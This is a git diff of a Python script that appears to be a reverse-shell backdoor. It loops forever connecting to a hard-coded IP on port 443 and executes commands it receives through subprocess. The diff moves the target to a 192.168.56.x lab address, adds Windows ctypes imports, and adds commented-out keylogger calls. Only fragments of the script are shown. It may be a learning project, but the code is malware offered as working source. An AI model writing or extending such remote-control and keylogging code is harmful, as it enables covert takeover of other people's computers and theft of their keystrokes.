@@ -3,7 +3,11 @@ import subprocess
 import socket
 import os
 
-IP = "192.168.1.80"
+from ctypes import windll
+import ctypes
+#global LOCK 
+
+IP = "192.168.56.101"
 PORT = 443
 
 
@@ -46,11 +50,16 @@ def cmd(c, data):
     except Exception as e:
         print(f'Error executing command: {e}')
         
+#
+
+        
         
 if __name__ == "__main__":
     try:
         while True:
             connection = connect(IP, PORT)
+            #keys = kl()
+            #pop = pop_keys()
             if connection:
                 listen(connection)
             else :
@@ -60,3 +69,6 @@ if __name__ == "__main__":
         
     except Exception as e:
         print(f'Error in main: {e}')
+        
+        
+        
